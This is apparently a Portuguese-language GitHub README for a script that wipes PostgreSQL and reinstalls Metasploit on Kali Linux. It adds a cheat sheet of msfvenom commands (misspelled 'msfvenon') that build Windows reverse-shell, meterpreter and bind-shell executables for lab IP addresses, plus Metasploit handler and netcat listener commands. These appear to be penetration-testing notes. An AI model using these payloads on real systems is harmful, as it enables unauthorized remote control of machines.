# metasploit

## Script para remoção do postgresql e reinstalação do Metasploit Framework no kali Linux

### Download
```
git clone https://github.com/thiagosmith/metasploit.git
```
### Acessando o diretório
```
cd metasploit
```
### Atribuindo a permissãode execução
```
chmod +x metasploit.sh
```
---
### Modo de uso
### Converter o script do formato dos para Linux
```
dos2unix ./metasploit.sh
```
### Execção do Script
```
sudo ./metasploit.sh
```

## Binários Windows
```
msfvenon -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o meterpreter.exe
```
```
msfvenon -p windows/shell_reverse_tcp LHOST=192.168.52.50 LPORT=4444 -f exe -o shell.exe
```
```
msfvenon -p windows/shell_bind_tcp RHOST=192.168.52.129 LPORT=4444 -f exe -o bind.exe
```
### Listener no metasploit
```
use exploit/multi/handler
```
```
set payload windows/x64/meterpreter/reverse_tcp
```
```
set LHOST 192.168.52.50 
```
```
set LPORT 4444
```
```
run
```
### Listener no netcat
```
nc -nlvp 4444
```
### Conexão do bind shell
```
nc 192.168.52.129 4444
```
# Observação
O Postgresql será removido e todos os dados armazenados no banco de dados será eliminado, para realizar a nova instalação limpa.
Não me responsabilizo por informações deletadas e ausência de backup.
